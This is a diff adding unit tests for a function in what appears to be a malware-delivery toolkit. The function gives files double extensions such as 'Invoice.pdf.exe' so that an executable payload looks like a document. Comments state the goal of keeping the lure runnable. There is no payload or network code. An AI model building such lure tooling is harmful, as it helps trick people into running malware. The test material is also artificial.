@@ -183,3 +183,32 @@ def test_every_registered_kind_has_an_extension_and_builds() -> None:
         name, body = next(iter(built.items()))
         assert name.endswith(wrappers.EXTENSIONS[kind])
         assert body
+
+
+# --- double extension -------------------------------------------------------
+
+
+def test_a_document_extension_hides_the_real_one() -> None:
+    assert wrappers.double_extension("Invoice.pdf") == "Invoice.pdf.exe"
+    assert wrappers.double_extension("photo.jpg", ".scr") == "photo.jpg.scr"
+
+
+def test_the_visible_name_still_ends_in_an_executable_extension() -> None:
+    # The payload has to remain runnable by extension. A lure named Invoice.pdf.exe is
+    # still an exe; a lure named Invoice.exe.pdf is a document that does nothing.
+    name = wrappers.double_extension("Report.docx")
+    assert name.lower().endswith(".exe")
+    assert name.lower().startswith("report.docx")
+
+
+@pytest.mark.parametrize("lure", ["Invoice", "..\\Invoice.pdf", r"C:\Invoice.pdf", "a/b.pdf"])
+def test_a_lure_that_is_not_a_plain_filename_is_refused(lure: str) -> None:
+    with pytest.raises(wrappers.WrapperError):
+        wrappers.double_extension(lure)
+
+
+def test_a_lure_wearing_an_executable_extension_is_refused() -> None:
+    # Invoice.exe.exe hides nothing and replaces the extension it pretends to keep.
+    for lure in ("Invoice.exe", "setup.scr", "loader.dll"):
+        with pytest.raises(wrappers.WrapperError):
+            wrappers.double_extension(lure)
